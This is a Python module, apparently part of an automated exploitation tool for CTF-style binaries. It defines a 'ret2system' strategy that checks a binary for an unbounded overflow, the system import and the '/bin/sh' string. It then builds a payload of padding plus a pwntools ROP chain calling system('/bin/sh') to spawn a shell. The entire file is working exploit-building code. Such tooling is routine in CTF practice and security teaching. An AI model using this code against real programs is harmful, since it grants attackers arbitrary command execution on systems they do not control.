"""ret2system strategy: build a ROP chain calling system("/bin/sh").

Works when the binary imports system and contains the string "/bin/sh" plus the
gadgets pwntools' ROP needs (typically `pop rdi; ret`). Non-PIE only here.
"""
from pwn import ROP

from .base import Strategy
from .. import report


class Ret2System(Strategy):
    name = "ret2system"
    desc = "ROP system('/bin/sh') for a shell"
    verifiable = False               # spawns a shell; no flag-in-output check

    def detect(self, ctx):
        b = ctx.binary
        if not ctx.analysis.primary_input or not ctx.analysis.primary_input.unbounded:
            return 0, "no unbounded overflow"
        if not b.has("system") or b.binsh() is None:
            return 0, "no system + /bin/sh"
        if b.pie:
            return 12, "PIE: needs a leak for gadget/base addresses"
        return 60, "system + /bin/sh present"

    def build(self, ctx):
        b = ctx.binary
        offset = ctx.ret_offset()
        if offset is None:
            return None, False, "offset unknown"
        binsh = b.binsh()
        try:
            rop = ROP(b.elf)
            rop.call(b.elf.plt.get("system") or b.elf.symbols["system"], [binsh])
            chain = rop.chain()
        except Exception as e:
            return None, False, f"ROP build failed: {e}"
        pad = (getattr(ctx.args, "pad", "A") or "A").encode()[:1]
        payload = pad * offset + chain
        return payload, True, f"{offset} pad + system('/bin/sh') ROP"
